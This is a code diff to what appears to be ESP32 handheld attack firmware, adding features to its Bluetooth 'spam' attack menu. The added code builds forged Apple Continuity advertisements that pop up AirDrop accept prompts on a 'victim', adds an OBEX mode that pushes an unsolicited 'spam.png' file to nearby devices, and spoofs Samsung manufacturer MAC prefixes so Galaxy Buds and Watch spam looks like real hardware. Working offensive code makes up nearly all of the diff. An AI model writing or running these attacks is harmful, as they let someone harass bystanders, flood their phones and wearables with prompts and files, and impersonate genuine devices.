@@ -34,6 +34,7 @@
 #include "core/radio_mem.h"
 #include "core/sd_functions.h"
 #include "core/utils.h"
+#include "ble_obex_send.h"
 #ifdef CONFIG_BT_NIMBLE_ENABLED
 #include "esp_mac.h"
 #if __has_include("host/ble_hs.h")
@@ -340,6 +341,9 @@ void generateRandomMac(uint8_t *mac) {
     mac[0] = (mac[0] & 0xFE) | 0x02;
 }
 
+// Samsung OUI MAC tracking for Galaxy Buds/Watch spam
+static int currentSamsungDeviceIndex = -1; // -1=none, 0=Buds, 1=Watch, 2=Generic, 3=Random
+
 BLEAdvertising *pAdvertising;
 
 BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type, const String &customName = "") {
@@ -557,10 +561,13 @@ enum BleSpamAttackType {
     BLE_SPAM_ATTACK_APPLE_PAIRING,
     BLE_SPAM_ATTACK_APPLE_ACTION,
     BLE_SPAM_ATTACK_APPLE_NOT_YOUR_DEVICE,
+    BLE_SPAM_ATTACK_AIRDROP_RECEIVE,
+    BLE_SPAM_ATTACK_AIRDROP_SEND,
     BLE_SPAM_ATTACK_ANDROID_ALERT,
     BLE_SPAM_ATTACK_WINDOWS_SWIFT_PAIR,
     BLE_SPAM_ATTACK_SAMSUNG,
     BLE_SPAM_ATTACK_BLE_BEACON,
+    BLE_SPAM_ATTACK_OBEX_FILE_PUSH,
     BLE_SPAM_ATTACK_RANDOM_ALL
 };
 
@@ -683,11 +690,14 @@ static const BleSpamAttackOption BLE_SPAM_ATTACK_OPTIONS[] = {
     {BLE_SPAM_ATTACK_APPLE_PAIRING,         "Apple Pairing Prompt" },
     {BLE_SPAM_ATTACK_APPLE_ACTION,          "Apple Action Modal"   },
     {BLE_SPAM_ATTACK_APPLE_NOT_YOUR_DEVICE, "Apple Not Your Device"},
+    {BLE_SPAM_ATTACK_AIRDROP_RECEIVE,       "AirDrop Receive Spam" },
+    {BLE_SPAM_ATTACK_AIRDROP_SEND,          "AirDrop Send Spam"    },
 #endif
     {BLE_SPAM_ATTACK_ANDROID_ALERT,         "Android Device Alert" },
     {BLE_SPAM_ATTACK_WINDOWS_SWIFT_PAIR,    "Windows Swift Pair"   },
     {BLE_SPAM_ATTACK_SAMSUNG,               "Samsung BLE Spam"     },
     {BLE_SPAM_ATTACK_BLE_BEACON,            "BLE Beacon Spam"      },
+    {BLE_SPAM_ATTACK_OBEX_FILE_PUSH,        "Send File (OBEX)"     },
     {BLE_SPAM_ATTACK_RANDOM_ALL,            "Random / All"         }
 };
 
@@ -1026,6 +1036,8 @@ static int bleSpamGetDeviceCount(BleSpamAttackType type) {
         case BLE_SPAM_ATTACK_APPLE_ACTION:
             return sizeof(BLE_SPAM_APPLE_ACTION_DEVICES) / sizeof(BleSpamAppleDevice) + 1;   // +1 Random/All
         case BLE_SPAM_ATTACK_APPLE_NOT_YOUR_DEVICE: return APPLE_PROXIMITY_DEVICE_COUNT + 1; // +1 Random/All
+        case BLE_SPAM_ATTACK_AIRDROP_RECEIVE: return 1; // Single mode - uses dynamic NearbyAction
+        case BLE_SPAM_ATTACK_AIRDROP_SEND: return 1;    // Single mode - uses dynamic NearbyAction
 #endif
         case BLE_SPAM_ATTACK_ANDROID_ALERT:
             return sizeof(BLE_SPAM_ANDROID_DEVICES) / sizeof(BLE_SPAM_ANDROID_DEVICES[0]);
@@ -1042,6 +1054,7 @@ static int bleSpamGetDeviceCount(BleSpamAttackType type) {
             std::vector<String> saved = bleSpamLoadCustomNames("bs_bn");
             return nPresets + 1 + (int)saved.size() + 1; // presets + Random/All + saved + Add New
         }
+        case BLE_SPAM_ATTACK_OBEX_FILE_PUSH: return 1; // Single mode - scan and send
         default: return 0;
     }
 }
@@ -1064,6 +1077,12 @@ static const char *bleSpamGetDeviceName(BleSpamAttackType type, int index) {
             if (index == staticCount) return "Random / All";
             return "Apple";
         }
+        case BLE_SPAM_ATTACK_AIRDROP_RECEIVE:
+            return "AirDrop Receive";
+        case BLE_SPAM_ATTACK_AIRDROP_SEND:
+            return "AirDrop Send";
+        case BLE_SPAM_ATTACK_OBEX_FILE_PUSH:
+            return "Send spam.png";
         case BLE_SPAM_ATTACK_APPLE_NOT_YOUR_DEVICE: {
             if (index >= 0 && index < APPLE_PROXIMITY_DEVICE_COUNT)
                 return APPLE_PROXIMITY_DEVICES[index].name;
@@ -1174,6 +1193,8 @@ static void bleSpamPickRandomSelection(BleSpamAttackType &attackType, int &devic
         {BLE_SPAM_ATTACK_APPLE_PAIRING,
                                   bleSpamGetDeviceCount(BLE_SPAM_ATTACK_APPLE_PAIRING) - 1                                   }, // -1 to exclude Random/All sentinel
         {BLE_SPAM_ATTACK_APPLE_ACTION,       bleSpamGetDeviceCount(BLE_SPAM_ATTACK_APPLE_ACTION) - 1},
+        {BLE_SPAM_ATTACK_AIRDROP_RECEIVE,     1                                                      },
+        {BLE_SPAM_ATTACK_AIRDROP_SEND,        1                                                      },
 #endif
         {BLE_SPAM_ATTACK_ANDROID_ALERT,      2                                                      }, // only Pixel + Generic, not Random/All
         {BLE_SPAM_ATTACK_WINDOWS_SWIFT_PAIR,
@@ -1273,7 +1294,33 @@ static bool bleSpamGetNextMac(BleSpamRunState &state, BleSpamMacRandMode mode, u
     if (divisor == 0) return false;
 
     if (!state.mac_initialized || (state.packet_counter > 0 && state.packet_counter % divisor == 0)) {
-        bleSpamFastRandomMac(outMac);
+        // For Samsung Galaxy Buds/Watch, use Samsung OUI MAC addresses
+        if (currentSamsungDeviceIndex == 0 || currentSamsungDeviceIndex == 1) {
+            // Samsung OUI prefixes
+            static const uint8_t samsung_ouis[][3] = {
+                {0x38, 0xAA, 0x3C},
+                {0x50, 0xCC, 0xF8},
+                {0x5C, 0xA3, 0x9D},
+                {0x78, 0xD6, 0xF0},
+                {0x84, 0x0B, 0x2D},
+                {0x90, 0x18, 0x7C},
+                {0x98, 0x0C, 0x82},
+                {0xA0, 0x0B, 0xBA},
+                {0xA8, 0xCA, 0xB9},
+                {0xB4, 0x07, 0xF9},
+                {0xCC, 0x3A, 0x61},
+                {0xDC, 0x71, 0x44},
+                {0xFC, 0x1F, 0x19}
+            };
+            const uint8_t *oui = samsung_ouis[random(sizeof(samsung_ouis) / 3)];
+            outMac[0] = oui[0];
+            outMac[1] = oui[1];
+            outMac[2] = oui[2];
+            esp_fill_random(&outMac[3], 3);
+            outMac[0] = (outMac[0] & 0xFE) | 0x02; // Locally administered, unicast
+        } else {
+            bleSpamFastRandomMac(outMac);
+        }
         return true;
     }
 
@@ -1339,6 +1386,31 @@ static bool bleSpamBuildAdvertisementData(
             // Same ProximityPair format, prefix 0x01 = "Not Your Device" variant.
             uint16_t deviceId = bleSpamResolveProximityDeviceId(deviceIndex);
             return buildAppleProximityPair(0x01, deviceId, advertisementData);
+        }
+#if !defined(LITE_VERSION)
+        case BLE_SPAM_ATTACK_AIRDROP_RECEIVE: {
+            // AirDrop Receive (action 0x05) - triggers "Accept AirDrop from [Name]?" on victim
+            uint8_t buf[31];
+            size_t len = bleSpamBuildContinuityNearbyAction(buf);
+            if (len == 0) return false;
+            // Override action byte to 0x05 (AirDrop Receive)
+            buf[6] = 0x05;
+            advertisementData = BLEAdvertisementData();
+            advertisementData.setFlags(0x06);
+            advertisementData.addData(buf, len);
+            return true;
+        }
+        case BLE_SPAM_ATTACK_AIRDROP_SEND: {
+            // AirDrop Send (action 0x24) - makes attacker appear as AirDrop destination
+            uint8_t buf[31];
+            size_t len = bleSpamBuildContinuityNearbyAction(buf);
+            if (len == 0) return false;
+            // Override action byte to 0x24 (AirDrop Send)
+            buf[6] = 0x24;
+            advertisementData = BLEAdvertisementData();
+            advertisementData.setFlags(0x06);
+            advertisementData.addData(buf, len);
+            return true;
         }
 #endif
         case BLE_SPAM_ATTACK_ANDROID_ALERT: {
@@ -1956,6 +2028,13 @@ static bool bleSpamStoppedPrompt(const BleSpamSelection &selection, uint32_t sen
 static void bleSpamRunScreen(const BleSpamSelection &selection, BleSpamConfig &config) {
     bool restart = false;
     do {
+        // Set Samsung device index for OUI MAC generation
+        if (selection.attack_type == BLE_SPAM_ATTACK_SAMSUNG) {
+            currentSamsungDeviceIndex = selection.device_index;
+        } else {
+            currentSamsungDeviceIndex = -1;
+        }
+
         BleSpamRunState runState;
         uint8_t initialMac[6];
         bool haveMac = bleSpamGetNextMac(runState, config.mac_rand_mode, initialMac);
@@ -2092,6 +2171,7 @@ static void bleSpamRunScreen(const BleSpamSelection &selection, BleSpamConfig &c
         }
 
         bleSpamDeinitAdvertiser();
+        currentSamsungDeviceIndex = -1;
         restart = bleSpamStoppedPrompt(selection, runState.sent_count);
     } while (restart);
 }
@@ -2207,6 +2287,12 @@ static void bleSpamMenuUi() {
         BleSpamSelection selection;
         selection.attack_type = bleSpamGetAttackTypeByIndex(attackIndex);
         selection.device_index = 0;
+
+        // OBEX File Push - uses Bluetooth Classic, not BLE
+        if (selection.attack_type == BLE_SPAM_ATTACK_OBEX_FILE_PUSH) {
+            obexSendFileMenu();
+            continue;
+        }
 
         // Types that go straight to config without a device list
         if (selection.attack_type == BLE_SPAM_ATTACK_RANDOM_ALL) {
